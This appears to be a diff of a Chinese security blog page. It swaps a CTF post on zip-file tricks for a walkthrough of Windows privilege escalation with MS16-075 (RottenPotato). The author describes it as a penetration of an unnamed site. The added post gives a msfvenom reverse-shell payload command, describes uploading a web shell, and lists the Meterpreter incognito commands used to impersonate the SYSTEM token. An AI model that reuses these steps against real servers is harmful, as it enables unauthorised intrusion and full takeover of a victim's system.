@@ -54,7 +54,7 @@
 <link href="/css/main.css?v=1.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="CTF," />
+  <meta name="keywords" content="渗透测试," />
 
 
 
@@ -72,18 +72,24 @@
 
 
 
-<meta name="description" content="埋头苦练 花式做题">
-<meta name="keywords" content="CTF">
+<meta name="description" content="实战是检验真理的唯一标准">
+<meta name="keywords" content="渗透测试">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF之压缩包">
-<meta property="og:url" content="http://yoursite.com/2017/09/21/CTF之压缩包/index.html">
+<meta property="og:title" content="利用MS16-075提权">
+<meta property="og:url" content="http://yoursite.com/2017/11/06/利用MS16-075提权/index.html">
 <meta property="og:site_name" content="Bang&#39;Blog">
-<meta property="og:description" content="埋头苦练 花式做题">
+<meta property="og:description" content="实战是检验真理的唯一标准">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-11-06T05:51:49.497Z">
+<meta property="og:image" content="http://test.52xss.com/img/test1.jpg">
+<meta property="og:image" content="http://test.52xss.com/img/test2.jpg">
+<meta property="og:image" content="http://test.52xss.com/img/test3.jpg">
+<meta property="og:image" content="http://test.52xss.com/img/test5.jpg">
+<meta property="og:image" content="http://test.52xss.com/img//test4.jpg">
+<meta property="og:updated_time" content="2017-11-06T05:36:56.076Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CTF之压缩包">
-<meta name="twitter:description" content="埋头苦练 花式做题">
+<meta name="twitter:title" content="利用MS16-075提权">
+<meta name="twitter:description" content="实战是检验真理的唯一标准">
+<meta name="twitter:image" content="http://test.52xss.com/img/test1.jpg">
 
 
 
@@ -113,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/09/21/CTF之压缩包/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/11/06/利用MS16-075提权/"/>
 
 
 
 
 
-  <title>CTF之压缩包 | Bang'Blog</title>
+  <title>利用MS16-075提权 | Bang'Blog</title>
   
 
 
@@ -276,7 +282,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/21/CTF之压缩包/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/06/利用MS16-075提权/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Bang">
@@ -293,7 +299,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">CTF之压缩包</h1>
+          <h1 class="post-title" itemprop="name headline">利用MS16-075提权</h1>
         
 
         <div class="post-meta">
@@ -305,8 +311,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-21T01:04:16+08:00">
-                2017-09-21
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-06T11:13:54+08:00">
+                2017-11-06
               </time>
             
 
@@ -343,23 +349,27 @@
       
 
       
-        <p><blockquote class="blockquote-center">埋头苦练 花式做题</blockquote><br><a id="more"></a></p>
-<h1 id="CTF之压缩包"><a href="#CTF之压缩包" class="headerlink" title="CTF之压缩包"></a>CTF之压缩包</h1><h3 id="1-暴力破解密码"><a href="#1-暴力破解密码" class="headerlink" title="1. 暴力破解密码"></a>1. 暴力破解密码</h3><ul>
-<li>推荐使用神器:</li>
-<li>ZipPasswordTool</li>
-<li>Ziperello</li>
+        <p><blockquote class="blockquote-center">实战是检验真理的唯一标准</blockquote><br><a id="more"></a></p>
+<h2 id="0x00-渗透环境"><a href="#0x00-渗透环境" class="headerlink" title="0x00.渗透环境:"></a>0x00.渗透环境:</h2><p>对某站进行一次渗透测试.拿到shell之后呢,权限蛮小的.但是可以执行一些命令.systeminfo瞅了瞅补丁列表,丢到exp查询看了下,发现可以利用烂土豆提权成功,别的都利用失败了。这里就记录下烂土豆的用法.<br>靶机:windows server 2008 IIS7.5<br>外网kali<br>利用工具:caidao+msf+rottenpotato.exe(MS16-075）<br>提权辅助查询:<a href="https://bugs.hacking8.com/tiquan/" target="_blank" rel="external">传送门</a></p>
+<p>菜刀来看下权限:</p>
+<p><img src="http://test.52xss.com/img/test1.jpg"></p>
+<h2 id="0x01-生成木马-建立meterpreter会话"><a href="#0x01-生成木马-建立meterpreter会话" class="headerlink" title="0x01.生成木马,建立meterpreter会话:"></a>0x01.生成木马,建立meterpreter会话:</h2><p>并不是system权限.这里我们要利用到msf,先生成一个木马,来获取sessions<br>生成了一个test.exe</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=120.*.*.* LPORT=12344 -f exe &gt; ./test.exe    
+</code></pre><p>这时候要用到菜刀或者大马.<br>菜刀&gt;&gt;上传&gt;&gt;执行&gt;&gt;test.exe<br>可能这时候有人会问我.都可以执行exe,直接上远控马不就行了么.我试过上远控马是不能上线的.(没测试低权限远控马)<br>执行之后msf返回了一个seeions</p>
+<p><img src="http://test.52xss.com/img/test2.jpg"></p>
+<h2 id="0x02-窃取令牌-模仿令牌"><a href="#0x02-窃取令牌-模仿令牌" class="headerlink" title="0x02.窃取令牌,模仿令牌"></a>0x02.窃取令牌,模仿令牌</h2><p>MS16-075(烂土豆)<br>项目地址:<a href="https://github.com/foxglovesec/RottenPotato" target="_blank" rel="external">传送门</a><br>用法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">use incognito</div><div class="line">//这个模块是用来窃取令牌，模仿令牌的.令牌相当于cookie.</div><div class="line">windows中有两种令牌,一中是Delegation Token，是交互式登录（比如登录进去系统或者通过远程桌面连接到系统）创建的.另一种是Impersonmate Token（模仿令牌），它是为非交互式会话创建的</div></pre></td></tr></table></figure></p>
+<p>列出当前令牌:</p>
+<pre><code>list_tokens -u    
+</code></pre><p><img src="http://test.52xss.com/img/test3.jpg"></p>
+<p>把rottenpotato.exe利用菜刀传上来.(比较懒重名名为rp.exe)<br>执行exp：<br>    execute -cH -f ./rp.exe    </p>
+<p>正常情况下会出现system用户,但是第一次执行提示我没有这个用户的令牌,可能令牌失效了.<br><img src="http://test.52xss.com/img/test5.jpg"></p>
+<p>模仿system令牌命令（注意这里有两个反斜杠）:</p>
+<pre><code>impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;    
+</code></pre><p><img src="http://test.52xss.com/img//test4.jpg"></p>
+<p>执行了数次之后成功模仿了用户 NT AUTHORITY\SYSTEM</p>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03.总结"></a>0x03.总结</h2><ul>
+<li>现学现卖简单记录下姿势利用.</li>
 </ul>
-<h3 id="2-压缩包伪加密"><a href="#2-压缩包伪加密" class="headerlink" title="2. 压缩包伪加密"></a>2. 压缩包伪加密</h3><ul>
-<li>搜索十六进制 50 4b 01 02 如果14 00 后面是01 00 ,或者09 00 则代表加密方式为伪加密</li>
-<li>使用ziprello如果显示无加密文件，则表示是伪加密</li>
-<li>使用binwalk 如果是伪加密，binwalk -e 可无视密码直接解压</li>
-<li>在kali下提取文件可无视伪加密</li>
-</ul>
-<h3 id="3-压缩包文件损坏"><a href="#3-压缩包文件损坏" class="headerlink" title="3. 压缩包文件损坏"></a>3. 压缩包文件损坏</h3><ul>
-<li>如果是损坏的压缩包，则可能是缺头缺尾</li>
-<li>解决的办法就是直接搜索一些开头和结尾标志，一般是缺少个文件头，或者搜索14 00 看前面有木有50 4B 这个<br>最后附上zip的文件标识</li>
-</ul>
-<p>压缩源文件数据区<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">50 4B 03 04：这是头文件标记（0x04034b50）</div><div class="line">14 00：解压文件所需 pkware 版本 </div><div class="line">00 00：全局方式位标记（有无加密） </div><div class="line">08 00：压缩方式 </div><div class="line">5A 7E：最后修改文件时间 </div><div class="line">F7 46：最后修改文件日期 </div><div class="line">16 B5 80 14：CRC-32校验（1480B516）</div><div class="line">19 00 00 00：压缩后尺寸（25）</div><div class="line">17 00 00 00：未压缩尺寸（23）</div><div class="line">07 00：文件名长度 </div><div class="line">00 00：扩展记录长度 </div><div class="line">6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 </div><div class="line">压缩源文件目录区 </div><div class="line">50 4B 01 02：目录中文件文件头标记(0x02014b50) </div><div class="line">3F 00：压缩使用的 pkware 版本 </div><div class="line">14 00：解压文件所需 pkware 版本 </div><div class="line">00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了） </div><div class="line">08 00：压缩方式 </div><div class="line">5A 7E：最后修改文件时间 </div><div class="line">F7 46：最后修改文件日期 </div><div class="line">16 B5 80 14：CRC-32校验（1480B516）</div><div class="line">19 00 00 00：压缩后尺寸（25）</div><div class="line">17 00 00 00：未压缩尺寸（23）</div><div class="line">07 00：文件名长度 </div><div class="line">24 00：扩展字段长度 </div><div class="line">00 00：文件注释长度 </div><div class="line">00 00：磁盘开始号 </div><div class="line">00 00：内部文件属性 </div><div class="line">20 00 00 00：外部文件属性 </div><div class="line">00 00 00 00：局部头部偏移量 </div><div class="line">6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 </div><div class="line">压缩源文件目录结束标志 </div><div class="line">50 4B 05 06：目录结束标记 </div><div class="line">00 00：当前磁盘编号 </div><div class="line">00 00：目录区开始磁盘编号 </div><div class="line">01 00：本磁盘上纪录总数 </div><div class="line">01 00：目录区中纪录总数 </div><div class="line">59 00 00 00：目录区尺寸大小 </div><div class="line">3E 00 00 00：目录区对第一张磁盘的偏移量 </div><div class="line">00 00：ZIP 文件注释长度</div></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -377,7 +387,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/CTF/" rel="tag"># CTF</a>
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
           
         </div>
       
@@ -390,15 +400,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2017/10/24/xss之旅-1-10/" rel="next" title="xss-bypass  1~10">
+                <i class="fa fa-chevron-left"></i> xss-bypass  1~10
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/10/12/Upload-bypass/" rel="prev" title="Upload bypass">
-                Upload bypass <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -575,7 +585,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF之压缩包"><span class="nav-number">1.</span> <span class="nav-text">CTF之压缩包</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-暴力破解密码"><span class="nav-number">1.0.1.</span> <span class="nav-text">1. 暴力破解密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-压缩包伪加密"><span class="nav-number">1.0.2.</span> <span class="nav-text">2. 压缩包伪加密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-压缩包文件损坏"><span class="nav-number">1.0.3.</span> <span class="nav-text">3. 压缩包文件损坏</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-渗透环境"><span class="nav-number">1.</span> <span class="nav-text">0x00.渗透环境:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-生成木马-建立meterpreter会话"><span class="nav-number">2.</span> <span class="nav-text">0x01.生成木马,建立meterpreter会话:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-窃取令牌-模仿令牌"><span class="nav-number">3.</span> <span class="nav-text">0x02.窃取令牌,模仿令牌</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-总结"><span class="nav-number">4.</span> <span class="nav-text">0x03.总结</span></a></li></ol></div>
             
 
           </div>
